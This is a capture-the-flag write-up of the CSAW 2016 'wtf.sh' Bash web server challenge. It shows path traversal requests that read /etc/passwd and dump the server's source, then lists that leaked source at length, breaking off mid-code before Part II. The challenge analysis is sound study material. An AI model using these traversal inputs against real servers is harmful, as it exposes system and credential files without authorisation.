---
layout: post
title: CSAW Quals 2016 wtf.sh I & II
tags: CTF, CSAW, Bash
---


# wtf.sh

There were two web challenges in one, 150 and 400 points respectively. The tasks explicitly said that we need to make the server run the `get_flag1` and `get_flag2` commands respectively. The given was a web page (later on we'd see it was a fully-featured web server) written in Bash. The challenge was fun. The author really went far with coding a web server in Bash, which even would work well if not [globbing](http://www.tldp.org/LDP/abs/html/globbingref.html) and [string interpolation](http://www.tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_04.html) which can trip up any Bash programmer in the final inches before olympic jump toward success.


# Part I

Hitting the main page at http://web.chal.csaw.io:8001/ showed something like the below:

![](http://i.imgur.com/6rEMBBt.png)

Here's a link map of functionality:

~~~
                       +---> New Post (/new_post.wtf) ----> Post (/post.wtf?post=<postID>) ---> Reply (/reply.wtf?post=<postID>)
                      /
      + --> Home ---> + ----> Profile (/profile.wtf?user=<userID>)
     /                \
    /                  + ---> Logout (/logout.wtf)
   /
root---> Login (/login.wtf)
    \
     +--> Register (/new_user.wtf)

~~~

Registered a user and started playing around with parameters. First one hit immediately: the `user` parameter of the Profile page was vulnerable to path traversal. Requesting `http://web.chal.csaw.io:8001/profile.wtf?user=../../../../../../../../../../etc/passwd` returns:

~~~

root:x:0:0:root:/root:/bin/bash's posts:

~~~

Obviously, something prevented the output. Later on it would become clear that it was just a `head -n1` on file. Having run `http://web.chal.csaw.io:8001/profile.wtf?user=../profile.wtf` to see the Profile source returned only:

~~~

$ # vim: ft=wtf's posts:

~~~

Decided to look for more issues in other scripts and my sight fell on `post.wtf`. I played around with the URL and finally had another interesting behavior as the result of requesting `http://web.chal.csaw.io:8001/post.wtf?post=../`:

~~~


<html>
<head>
<link rel="stylesheet" type="text/css" href="/css/std.css" >
<link rel="stylesheet" type="text/css" href="/css/post.css" >
</head>
<body>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE"></a></span>
<span class="post-title"></span>
<span class="post-body"></span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE"></a></span>
<span class="post-title"></span>
<span class="post-body"></span>

...

...


<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE"></a></span>
<span class="post-title"></span>
<span class="post-body"></span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">$ # vim: ft=wtf</a></span>
<span class="post-title">&lt;html&gt;</span>
<span class="post-body">$ source user_functions.sh
&lt;head&gt;
    &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Welcome to the wtf.sh Forums!&lt;/h1&gt;
$ if is_logged_in
$ then
$   echo "&lt;p&gt;Hi, ${COOKIES['USERNAME']}. &lt;a href='/logout.wtf'&gt;Logout&lt;/a&gt; &lt;a href='/profile.wtf?user=$(basename $(find_user_file ${COOKIES['USERNAME']}))'&gt;Profile&lt;/a&gt;&lt;/p&gt;"
$   echo "&lt;a href=/new_post.wtf&gt;New Post&lt;/a&gt;";
$ else
$   echo "&lt;p&gt;You're not logged in. &lt;a href='/login.wtf'&gt;Login&lt;/a&gt; &lt;a href='/new_user.wtf'&gt;Register&lt;/a&gt;&lt;/p&gt;"
$ fi
    &lt;h3&gt;Posts:&lt;/h3&gt;
    &lt;ol&gt;
$ if [[ -e .index_cache.html ]]
$ then
$   cat .index_cache.html;
$ else
$   for post_file in posts/*; do
$       post_file=$(basename $post_file);
$       post_title=$(nth_line 2 &lt; posts/$post_file | htmlentities);
$       post_user=$(nth_line 1 &lt; posts/$post_file | htmlentities);
$       echo "&lt;li&gt;&lt;a href=\"/post.wtf?post=$post_file\"&gt;$post_title&lt;/a&gt; by ${post_user}&lt;/li&gt;";
$   done;
$ fi
    &lt;/ol&gt;
&lt;/body&gt;
&lt;/html&gt;</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">#!/usr/bin/env bash</a></span>
<span class="post-title"></span>
<span class="post-body"># Some useful standard functions to have around :)

# check if an array contains a given value
# contains "asdf" "asdf an array of values" =&gt; has exit code 0
function contains {
    local e;
    for e in "${@:2}"; do [[ "$e" == "$1" ]] &amp;&amp; return 0; done;
    return 1;
}

function file_exists {
    local file=$1;
    stat ${file} &gt; /dev/null;
}

function nth_line {
    local n=$1;
    local filename;
    if [[ $# != 1 ]]
    then
        filename=$2;
        sed "${n}q;d" &lt; $filename;
    else
        sed "${n}q;d"
    fi 2&gt; /dev/null
}

function redirect {
    local target="$1";
    echo "&lt;script&gt;window.location.href='${target}';&lt;/script&gt;";
}

# Hacky way of figuring out which date command is appropriate,
# depending if we're on BSD or GNU coreutils
YESTERDAY_CMD="";
TOMORROW_CMD="";
if date --help | grep "GNU" &gt; /dev/null
then
    # Using GNU date
    TOMORROW_CMD="date -d tomorrow";
    YESTERDAY_CMD="date -d yesterday";
else
    # Using BSD date
    TOMORROW_CMD="date -v +1d";
    YESTERDAY_CMD="date -v -1d";
fi

function set_cookie {
    local key="$1";
    local value="$2";
    local expiry=$(${TOMORROW_CMD});
    echo "&lt;script&gt;document.cookie = '${key}=${value}; expires=${expiry}; path=/';&lt;/script&gt;";
    COOKIES[$key]="${value}";
}

function get_cookie {
    echo "${COOKIES[$1]}";
}

function remove_cookie {
    local key="$1";
    local expiry=$(${YESTERDAY_CMD}); # expiration dates in the past delete cookies
    echo "&lt;script&gt;document.cookie = '${key}=riperino; expires=${expiry}; path=/';&lt;/script&gt;";
    unset COOKIES[$key];
}

# take text on input, transform any html special chars to the corresponding entities
function htmlentities {
    sed "s/\&amp;/\&amp;amp;/g" | sed "s/&lt;/\&amp;lt;/g" | sed "s/&gt;/\&amp;gt;/g";
}</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">$ # vim: ft=wtf</a></span>
<span class="post-title">&lt;html&gt;</span>
<span class="post-body">&lt;head&gt;
    &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;
&lt;/head&gt;
$ source user_functions.sh
$ if [[ $method = 'POST' ]]
$ then
$   local username=${POST_PARAMS['username']};
$   local password=${POST_PARAMS['password']};
$   local userfile=$(find_user_file ${username});
$   if [[ ${userfile} != 'NONE' ]]
$   then 
$       # User exists, try to login
$       if $(check_password ${username} ${password})
$       then
$           # correct pass
$           set_cookie "USERNAME" ${username};
$           set_cookie "TOKEN" $(nth_line 3 ${userfile});
$           redirect "/";
$       else 
$           # incorrect pass
$           echo "&lt;h3&gt;Sorry, wrong password for user ${username}:(&lt;br&gt;Try again?&lt;/h3&gt;";
$       fi
$   else
$       # user doesn't exist
$       echo "&lt;h3&gt;Sorry, user ${username} doesn't exist :(&lt;br&gt;Try again?&lt;/h3&gt;"
$   fi
$ fi
&lt;h3&gt;Login&lt;/h3&gt;
&lt;form method=POST&gt;
&lt;input type=text name=username placeholder="username"&gt;&lt;/input&gt;&lt;br&gt;
&lt;input type=password name=password placeholder="password"&gt;&lt;/input&gt;&lt;br&gt;
&lt;button type=submit name=submit&gt;Submit&lt;/button&gt;
&lt;/form&gt;
&lt;/html&gt;</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">$ # vim: ft=wtf</a></span>
<span class="post-title">&lt;html&gt;</span>
<span class="post-body">&lt;head&gt;
    &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;
&lt;/head&gt;
$ source user_functions.sh
$ if is_logged_in
$ then 
$   remove_cookie 'USERNAME';
$   remove_cookie 'TOKEN';
$   redirect "/";
$ else
$   echo "&lt;h3&gt;You need to be logged in to log out, bud.&lt;/h3&gt;";
$ fi
&lt;/html&gt;</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">$ # vim: ft=wtf</a></span>
<span class="post-title">&lt;html&gt;</span>
<span class="post-body">&lt;head&gt;
    &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;
&lt;/head&gt;
$ source user_functions.sh
$ source post_functions.sh
$ if [[ $method = 'POST' ]]
$ then
$   if is_logged_in
$   then
$       post_id=$(create_post "${COOKIES['USERNAME']}" "${POST_PARAMS['title']}" "${POST_PARAMS['text']}");
$       redirect "/post.wtf?post=${post_id}";
$   else
$       echo "&lt;h3&gt;pls login 2 be posting&lt;/h3&gt;";
$   fi
$ fi
&lt;form method=POST&gt;
&lt;input type=text name=title placeholder="Post Title"&gt;&lt;/input&gt;&lt;br&gt;
&lt;textarea name=text placeholder="Post Text"&gt;&lt;/textarea&gt;&lt;br&gt;
&lt;button type=submit name=submit&gt;Submit&lt;/button&gt;
&lt;/form&gt;
&lt;/html&gt;</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">$ # vim: ft=wtf</a></span>
<span class="post-title">&lt;html&gt;</span>
<span class="post-body">&lt;head&gt;
    &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;
&lt;/head&gt;
$ source user_functions.sh
$ if [[ $method = 'POST' ]]
$ then
$   local username=${POST_PARAMS['username']};
$   local password=${POST_PARAMS['password']};
$   if [[ $(find_user_file "${username}") = 'NONE' ]]
$   then 
$       # create user
$       echo "ok, gonna go make that user... ${username}";
$       local user_id=$(create_user "${username}" "${password}");
$       redirect "/login.wtf";
$   else
$       # user already exists
$       echo "&lt;h3&gt;Sorry, user ${username} already exists :(&lt;br&gt;Try again?&lt;/h3&gt;"
$   fi
$ fi
&lt;h3&gt;Register&lt;/h3&gt;
&lt;form method=POST&gt;
&lt;input type=text name=username placeholder="username"&gt;&lt;/input&gt;&lt;br&gt;
&lt;input type=password name=password placeholder="password"&gt;&lt;/input&gt;&lt;br&gt;
&lt;button type=submit name=submit&gt;Submit&lt;/button&gt;
&lt;/form&gt;
&lt;/html&gt;</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">$ # vim: ft=wtf</a></span>
<span class="post-title">&lt;html&gt;</span>
<span class="post-body">&lt;head&gt;
    &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;
    &lt;link rel="stylesheet" type="text/css" href="/css/post.css" &gt;
&lt;/head&gt;
&lt;body&gt;
$ source user_functions.sh
$ if contains 'post' ${!URL_PARAMS[@]} &amp;&amp; file_exists "posts/${URL_PARAMS['post']}"
$ then
$   post_id=${URL_PARAMS['post']};
$   for post_file in $(ls posts/${post_id}/* | sort --field-separator='/' --key=3 -n); do
$       echo "&lt;div class=\"post\"&gt;";
$       poster=$(nth_line 1 ${post_file} | htmlentities);
$       title=$(nth_line 2 ${post_file} | htmlentities);
$       body=$(tail -n +3 ${post_file} | htmlentities 2&gt; /dev/null);
$       echo "&lt;span class=\"post-poster\"&gt;Posted by &lt;a href=\"/profile.wtf?user=$(basename $(find_user_file "${poster}"))\"&gt;${poster}&lt;/a&gt;&lt;/span&gt;";
$       echo "&lt;span class=\"post-title\"&gt;$title&lt;/span&gt;";
$       echo "&lt;span class=\"post-body\"&gt;$body&lt;/span&gt;";
$       echo "&lt;/div&gt;";
$   done
$ else
$   echo "Pls give a (valid) post id";
$ fi;

&lt;div class="action-btns"&gt;
$   echo "&lt;a href=\"/reply.wtf?post=${post_id}\"&gt;Reply&lt;/a&gt;"
&lt;a href="/"&gt;Back&lt;/a&gt;
&lt;/div&gt;

&lt;/body&gt;
&lt;/html&gt;</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">#!/usr/bin/env bash</a></span>
<span class="post-title"></span>
<span class="post-body">source user_functions.sh

# Create a new post. Returns the post id.
function create_post {
    local username=$1;
    local title=$2;
    local text=$3;
    local hashed=$(hash_username "${username}");

    # ensure posts dir exists and isn't listable.
    mkdir posts 2&gt; /dev/null;
    touch posts/.nolist; # don't allow directory listing on posts
    touch posts/.noread; # don't allow file reads on post

    local post_id=$(basename $(mktemp --directory posts/XXXXX));


    echo ${username} &gt; "posts/${post_id}/1";
    echo ${title} &gt;&gt; "posts/${post_id}/1";
    echo ${text} &gt;&gt; "posts/${post_id}/1";

    touch "posts/${post_id}/.nolist";
    touch "posts/${post_id}/.noread";


    # add to our cache for the homepage
    echo "&lt;li&gt;&lt;a href=\"/post.wtf?post=${post_id}\"&gt;$(htmlentities &lt;&lt;&lt; ${title})&lt;/a&gt; by $(htmlentities &lt;&lt;&lt; ${username})&lt;/li&gt;" &gt;&gt; .index_cache.html

    # add post to users' post cache
    local hashed=$(hash_username "${username}");
    echo "${post_id}/1" &gt;&gt; "users_lookup/${hashed}/posts";

    echo ${post_id};

}

function reply {
    local post_id=$1;
    local username=$2;
    local text=$3;
    local hashed=$(hash_username "${username}");

    curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
    next_reply_id=$(awk '{print $1+1}' &lt;&lt;&lt; "${curr_id}");
    next_file=(posts/${post_id}/${next_reply_id});
    echo "${username}" &gt; "${next_file}";
    echo "RE: $(nth_line 2 &lt; "posts/${post_id}/1")" &gt;&gt; "${next_file}";
    echo "${text}" &gt;&gt; "${next_file}";

    # add post this is in reply to to posts cache
    echo "${post_id}/${next_reply_id}" &gt;&gt; "users_lookup/${hashed}/posts";
}</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE"></a></span>
<span class="post-title"></span>
<span class="post-body"></span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">$ # vim: ft=wtf</a></span>
<span class="post-title">$ source user_functions.sh</span>
<span class="post-body">&lt;html&gt;
&lt;head&gt;
    &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;
&lt;/head&gt;
$ if contains 'user' ${!URL_PARAMS[@]} &amp;&amp; file_exists "users/${URL_PARAMS['user']}"
$ then
$   local username=$(head -n 1 users/${URL_PARAMS['user']});
$   echo "&lt;h3&gt;${username}'s posts:&lt;/h3&gt;";
$   echo "&lt;ol&gt;";
$   get_users_posts "${username}" | while read -r post; do
$       post_slug=$(awk -F/ '{print $2 "#" $3}' &lt;&lt;&lt; "${post}");
$       echo "&lt;li&gt;&lt;a href=\"/post.wtf?post=${post_slug}\"&gt;$(nth_line 2 "${post}" | htmlentities)&lt;/a&gt;&lt;/li&gt;";
$   done 
$   echo "&lt;/ol&gt;";
$   if is_logged_in &amp;&amp; [[ "${COOKIES['USERNAME']}" = 'admin' ]] &amp;&amp; [[ ${username} = 'admin' ]]
$   then
$       get_flag1
$   fi
$ fi
&lt;/html&gt;</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">$ # vim: ft=wtf</a></span>
<span class="post-title">&lt;html&gt;</span>
<span class="post-body">&lt;head&gt;
    &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;
&lt;/head&gt;
$ source user_functions.sh
$ source post_functions.sh
$ if [[ $method = 'POST' ]]
$ then
$   if is_logged_in
$   then
$       if [[ ${POST_PARAMS['text']} != '' &amp;&amp; ${URL_PARAMS['post']} != '' ]]
$       then
$           reply "${URL_PARAMS['post']}" "${COOKIES['USERNAME']}" "${POST_PARAMS['text']}"
$           redirect "/post.wtf?post=${URL_PARAMS['post']}#${next_post_id}";
$       else
$           redirect "/reply.wtf?post=${URL_PARAMS['post']}";
$       fi
$   else
$      redirect "/login.wtf"
$   fi
$ fi

$ if [[ ${URL_PARAMS['post']} = '' ]] 
$ then
$   echo "u need to be replying to a post, you dumdum";
$ fi

$ if is_logged_in
$ then
$   echo "u r logged in, s0 gib reply"
$ else
$   redirect "/login.wtf"
$ fi
&lt;form method=POST&gt;
&lt;textarea name=text placeholder="Reply Text"&gt;&lt;/textarea&gt;&lt;br&gt;
&lt;button type=submit name=submit&gt;Submit&lt;/button&gt;
&lt;/form&gt;
&lt;/html&gt;</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">#!/usr/bin/env bash</a></span>
<span class="post-title"></span>
<span class="post-body">cp -R /opt/wtf.sh /tmp/wtf_runtime;

# protect our stuff
chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.wtf;
chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.sh;
chmod 777 /tmp/wtf_runtime/wtf.sh/;

# set all dirs we could want to write into to be owned by www
# (We don't do whole webroot since we want the people to be able to create
#   files in webroot, but not overwrite existing files)
chmod -R 777 /tmp/wtf_runtime/wtf.sh/posts/;
chown -R www:www /tmp/wtf_runtime/wtf.sh/posts/;

chmod -R 777 /tmp/wtf_runtime/wtf.sh/users/;
chown -R www:www /tmp/wtf_runtime/wtf.sh/users/;

chmod -R 777 /tmp/wtf_runtime/wtf.sh/users_lookup/;
chown -R www:www /tmp/wtf_runtime/wtf.sh/users_lookup/;

# let's get this party started!
su www -c "/tmp/wtf_runtime/wtf.sh/wtf.sh 8000";</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">#!/usr/local/bin/bash</a></span>
<span class="post-title"></span>
<span class="post-body">function hash_password {
    local password=$1;
    (shasum &lt;&lt;&lt; ${password}) | cut -d\  -f1;
}

# hash usernames for lookup in the users_lookup table
function hash_username {
    local username=$1;
    (shasum &lt;&lt;&lt; ${username}) | cut -d\  -f1;
}

# generate a random token, base64 encoded
# on GNU base64 wraps at 76 characters, so we need to pass --wrap=0
function generate_token {
    (head -c 64 | (base64 --wrap=0 || base64)) &lt; /dev/urandom 2&gt; /dev/null;
}

function find_user_file {
    local username=$1;
    local hashed=$(hash_username "${username}");
    local f;
    if [[ -n "${username}" &amp;&amp; -e "users_lookup/${hashed}" ]]
    then
        echo "users/$(cat "users_lookup/${hashed}/userid")";
    else
        echo "NONE"; # our failure case -- ugly but w/e...
    fi;
    return;
}

# The caller is responsible for checking that the user doesn't exist already calling this
function create_user {
    local username=$1;
    local password=$2;
    local hashed_pass=$(hash_password ${password});
    local hashed_username=$(hash_username "${username}");
    local token=$(generate_token);

    mkdir users 2&gt; /dev/null; # make sure users directory exists
    touch users/.nolist; # make sure that the users dir can't be listed
    touch users/.noread; # don't allow reading of user files directly

    mkdir users_lookup 2&gt; /dev/null; # make sure the username -&gt; userid lookup directory exists
    touch users_lookup/.nolist; # don't let it be listed

    local user_id=$(basename $(mktemp users/XXXXX));


    # user files look like:
    #   username
    #   hashed_pass
    #   token
    echo "${username}" &gt; "users/${user_id}";
    echo "${hashed_pass}" &gt;&gt; "users/${user_id}";
    echo "${token}" &gt;&gt; "users/${user_id}";


    mkdir "users_lookup/${hashed_username}" 2&gt; /dev/null;
    touch "users_lookup/${hashed_username}/.nolist"; # lookup dir for this user can't be readable
    touch "users_lookup/${hashed_username}/.noread"; # don't allow reading the lookup dir
    touch "users_lookup/${hashed_username}/posts"; # lookup for posts this user has participated in
    echo "${user_id}" &gt; "users_lookup/${hashed_username}/userid"; # create reverse lookup

    echo ${user_id};
}

function check_password {
    local username=$1;
    local password=$2;
    local userfile=$(find_user_file ${username});

    if [[ ${userfile} = 'NONE' ]]
    then
        return 1;
    fi

    local hashed_pass=$(hash_password ${password});
    local correct_hash=$(head -n2 ${userfile} | tail -n1);
    [[ ${hashed_pass} = ${correct_hash} ]];
    return $?;
}

function is_logged_in {
    contains 'TOKEN' ${!COOKIES[@]} &amp;&amp; contains 'USERNAME' ${!COOKIES[@]};
    local has_cookies=$?
    local userfile=$(find_user_file ${COOKIES['USERNAME']});
    [[ ${has_cookies} \
        &amp;&amp; ${userfile} != 'NONE' \
        &amp;&amp; $(tail -n1 ${userfile} 2&gt;/dev/null) = ${COOKIES['TOKEN']} \
        &amp;&amp; $(head -n1 ${userfile} 2&gt;/dev/null) = ${COOKIES['USERNAME']} \
    ]];
    return $?;
}

function get_users_posts {
    local username=$1;
    local hashed=$(hash_username "${username}");
    # we only have to iterate over posts a user has replied to
    while read -r post_id; do
        echo "posts/${post_id}";
    done &lt; "users_lookup/${hashed}/posts";
}</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE"></a></span>
<span class="post-title"></span>
<span class="post-body"></span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE"></a></span>
<span class="post-title"></span>
<span class="post-body"></span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE">#!/usr/bin/env bash</a></span>
<span class="post-title"></span>
<span class="post-body"># config stuff
PROCESS_LIMIT=512 # per connection
PROFILE=false

# shell options
shopt -s extglob;

# ~~ PROFILING ~~
if [[ $PROFILE = true ]]
then
    PS4='+ $(date "+%s.%N") $(if [[ ${FUNCNAME} = "" ]]; then echo NONE; else echo "${FUNCNAME}"; fi ) ${LINENO}\011 '
    exec 3&gt;&amp;2 2&gt;/tmp/bashprof.$$.log
    set -x
fi

# sick facts about bash
declare -a BASH_FACTS=(
    $'Bash has an `until` keyword, which is equivalent to `while not`.' 
    $'Single and Double quotes do different things in bash -- single quotes do not interpolate variables, while double quotes do.' 
    $'When globbing on arrays in bash, you have the option to use [*] and [@], which appear to both return all the elements of the array. However, [*] acts like a "splat operator", while [@] keeps all everything constrained to the same argument.' 
    $'The bash array access syntax looks like ${array[$idx]}.' 
    $'If you forget the brackets in an array access, bash will just return the first element of the array.' 
    $'Bash didn\'t have Associative Arrays until Bash 4' 
    $'The idomatic way of iterating over all the lines in a file in bash is `while read -r line; do &lt;something with line&gt;; done &lt; &lt;filename&gt;`' 
    $'Loops are just commands. So, you can pipe things into and out of them!'
    );

source lib.sh # import stdlib

VERSION="0.0.0.0.1 \"alphaest of bets\""
declare -a REPLY_HEADERS=(
    "X-Powered-By: wtf.sh ${VERSION}" # Fly the banner of wtf.sh proudly!
    "X-Bash-Fact: $(shuf --head-count=1 -e "${BASH_FACTS[@]}")" # select a random BASH FACT to include
);

declare -A URL_PARAMS # hashtable of url parameters
declare -A POST_PARAMS # hashtable of post parameters
declare -A HTTP_HEADERS # hashtable of http headers
declare -A COOKIES # hashtable of cookies



function log {
    echo "[`date`] $@" 1&gt;&amp;9
}

urldecode() {
    # urldecode &lt;string&gt;

    local url_encoded="${1//+/ }"
    printf '%b' "${url_encoded//%/\\x}"
}

max_page_include_depth=64
page_include_depth=0
function include_page {
    # include_page &lt;pathname&gt;
    local pathname=$1
    local cmd=""
    [[ "${pathname:(-4)}" = '.wtf' ]];
    local can_execute=$?;
    page_include_depth=$(($page_include_depth+1))
    if [[ $page_include_depth -lt $max_page_include_depth ]]
    then
        local line;
        while read -r line; do
            # check if we're in a script line or not ($ at the beginning implies script line)
            # also, our extension needs to be .wtf
            [[ "$" = "${line:0:1}" &amp;&amp; ${can_execute} = 0 ]];
            is_script=$?;

            # execute the line.
            if [[ $is_script = 0 ]]
            then
                cmd+=$'\n'"${line#"$"}";
            else
                if [[ -n $cmd ]]
                then
                    eval "$cmd" || log "Error during execution of ${cmd}";
                    cmd=""
                fi
                echo $line
            fi
        done &lt; ${pathname}
    else
        echo "&lt;p&gt;Max include depth exceeded!&lt;p&gt;"
    fi
}

function parse_headers {
    while read -r line; do
        if [[ $line = $'\r' || $line == $'\n' ]]
        then
            break
        else
            a=($line)
            key=${a[0]%?}
            value=${a[@]:1}
            HTTP_HEADERS[$key]=${value:0:-1}; # remove \r from end
        fi
    done
}

function parse_cookies {
    while read -d ';' -r cookie; do
        local key=$(cut -d\= -f1 &lt;&lt;&lt; "${cookie}");
        local value=${cookie#*=};
        COOKIES[${key}]=${value};
    done &lt;&lt;&lt; "${HTTP_HEADERS['Cookie']};" # append a ; so we still get the last field -- read drops the last thing &gt;_&lt;
}

function handle_connection {
    ulimit -u "${PROCESS_LIMIT}"; # limit num processes per connection

    # Parse query and any url parameters that may be in the path
    IFS=' ' read -r method path version

    # fast fail on empty request
    if [[ ${method} = '' ]]
    then
        return
    fi

    query=${path##*\?};
    if [[ $query != $path ]]
    then
        while read -d '&amp;' -r param; do
            IFS='=' read key value &lt;&lt;&lt; ${param};
            URL_PARAMS[$key]=$(urldecode $value)
        done &lt;&lt;&lt; "${query}&amp;" # add &amp; so last argument is seen
    fi

    request=("$method" "$path" "$version")
    path=$(urldecode $(cut -d\? -f1 &lt;&lt;&lt; "${path}")) # strip url parameters, urldecode

    # parse headers
    parse_headers;

    # parse out cookie values, if they exist
    if contains "Cookie" "${!HTTP_HEADERS[@]}"
    then
        parse_cookies;
    fi
    
    if [[ $method == "POST" ]]
    then
        # TODO: handle multipart bodies
        local line;
        local n;
        n=${HTTP_HEADERS['Content-Length']};
        read -n$n -r line;
        params=($(sed "s/\&amp;/ /g" &lt;&lt;&lt; "${line}"))
        for param in ${params[@]}; do
            IFS='=' read key value &lt;&lt;&lt; ${param};
            POST_PARAMS[$key]=$(urldecode $value)
        done
    fi

    # if we know the IP (via an X-Forwarded-For header), stick the user in a sandbox
    # (Cloudflare will fill in this IP in prod, we can also have nginx fill it in in dev if we want)
    if contains "X-Forwarded-For" "${!HTTP_HEADERS[@]}"
    then
        sandbox_dir="$((cksum &lt;&lt;&lt; ${HTTP_HEADERS["X-Forwarded-For"]}) | cut -d\  -f1).sandbox";
        # create sandbox if it doesn't exist
        if [[ ! -e "${sandbox_dir}" ]]
        then
            mkdir "${sandbox_dir}";
            # copy anything that isn't itself a sandbox to the dir
            cp -R !(*.sandbox) "${sandbox_dir}";
        fi
        cd "${sandbox_dir}";
    else
        log "WARNING: Not sandboxing: no X-Forwarded-For header found!"
    fi

    requested_path=$(pwd)/${path}

    # if a directory is requested, try each of the following, in order
    # index.wtf, index.html
    local index_fills=("index.wtf" "index.html");
    if [[ -d ${requested_path} ]]
    then
        for i in ${index_fills}; do
            if [[ -e "${requested_path}/${i}" ]]
            then
                requested_path="${requested_path}/${i}";
                break;
            fi
        done
    fi

    # check for possible directory traversals / other undesirable path elements by
    # removing them and 503-ing if the string was changed
    test_path=$(sed "s/\.\.//g" &lt;&lt;&lt; "${requested_path}")
    if [[ ${test_path} != ${requested_path} ]]
    then
        echo "HTTP/1.1 503 Forbidden"
        echo "Content-Type: text/html"
        for reply_header in "${REPLY_HEADERS[@]}"; do
            echo "${reply_header}"
        done
        printf "\r\n\r\n"
        echo "&lt;html&gt;&lt;title&gt;503&lt;/title&gt;&lt;body&gt;503 Forbidden&lt;/body&gt;&lt;/html&gt;"
        echo "&lt;p&gt;Sorry, directory traversal is strongly frowned upon here at wtf.sh enterprises&lt;/p&gt;";
        log "503: ${request[@]}"
        exit 0; # terminate early for 503
    fi

    [[ ! -e "${requested_path}/.nolist" ]];
    local can_list=$?;
    [[ ! -e "$(dirname "${requested_path}")/.noread" ]];
    local can_read=$?;

    if [[ -e ${requested_path}  ]]
    then
        if [[ -f ${requested_path} \
            &amp;&amp; ${requested_path:(-4)} != ".log"\
            &amp;&amp; ${can_read} = 0 ]] # can't end in .log, can't have .noread in the parent directory
        then
            echo "HTTP/1.1 200 OK"
            echo "Content-Type: text/html"
            for reply_header in "${REPLY_HEADERS[@]}"; do
                echo "${reply_header}"
            done
            printf "\r\n\r\n"
            include_page ${requested_path};
        elif [[ -d ${requested_path} \
            &amp;&amp; ${can_list} = 0 ]] # handle directory listing if it isn't a file and no `.nolist` file in the directory
        then
            log "$(dirname "${requested_path}")/.noread"
            echo "HTTP/1.1 200 OK"
            echo "Content-Type: text/html"
            for reply_header in "${REPLY_HEADERS[@]}"; do
                echo "${reply_header}"
            done
            printf "\r\n\r\n"
            echo "&lt;h3&gt;Index of ${request[1]}&lt;/h3&gt;"
            echo "&lt;ul&gt;"
            for d in ${requested_path}/*; do
                size_info=($(du -h ${requested_path} | tail -n 1))
                echo "&lt;li&gt;&lt;a href="/${request[1]#"/"}${d}"&gt;${d}&lt;/a&gt;: ${size_info[0]}&lt;/li&gt;"
            done
            echo "&lt;/ul&gt;"
            echo "&lt;font size=2&gt;generated by wtf.sh ${VERSION} on $(date)&lt;/font&gt;"
        else
            echo "HTTP/1.1 503 Forbidden"
            echo "Content-Type: text/html"
            for reply_header in "${REPLY_HEADERS[@]}"; do
                echo "${reply_header}"
            done
            printf "\r\n\r\n"
            echo "&lt;title&gt;503 Forbidden&lt;/title&gt;";
            echo "&lt;h3&gt;I'm sorry, I'm afraid I can't let you see that&lt;/h3&gt;";
            echo "&lt;p&gt;It seems that you tried to list a directory with a &lt;code&gt;.nolist&lt;/code&gt; file in it, or a &lt;code&gt;.noread&lt;/code&gt; file in it's parent, or a forbidden file type.&lt;/p&gt;";
            echo "&lt;p&gt;If you think this was a mistake, I feel bad for you, son. I got 99 problems, but a 503 ain't one.&lt;/p&gt;";
            log "503: ${request[@]}"
            exit 0;
        fi
        log "200: ${request[@]}"
        exit 0
    else
        # If we were noread or nolist, send a 503, even though the resource doesn't even exist -- we don't want to leak what forbidden resources do and do not exist
        if [[ ${can_read} = 1 || ${can_list} = 1 ]]; 
        then
            echo "HTTP/1.1 503 Not Found";
            echo "Content-Type: text/html"
            for reply_header in "${REPLY_HEADERS[@]}"; do
                echo "${reply_header}"
            done
            printf "\r\n\r\n"
            echo "&lt;title&gt;503 Forbidden&lt;/title&gt;";
            echo "&lt;h3&gt;I'm sorry, I'm afraid I can't let you see that&lt;/h3&gt;";
            echo "&lt;p&gt;It seems that you tried to list a directory with a &lt;code&gt;.nolist&lt;/code&gt; file in it, or a &lt;code&gt;.noread&lt;/code&gt; file in it's parent, or a forbidden file type.&lt;/p&gt;";
            echo "&lt;p&gt;If you think this was a mistake, I feel bad for you, son. I got 99 problems, but a 503 ain't one.&lt;/p&gt;";
            log "503: ${request[@]}"
        else
            echo "HTTP/1.1 404 Not Found"
            echo "Content-Type: text/html"
            for reply_header in "${REPLY_HEADERS[@]}"; do
                echo "${reply_header}"
            done
            printf "\r\n\r\n"
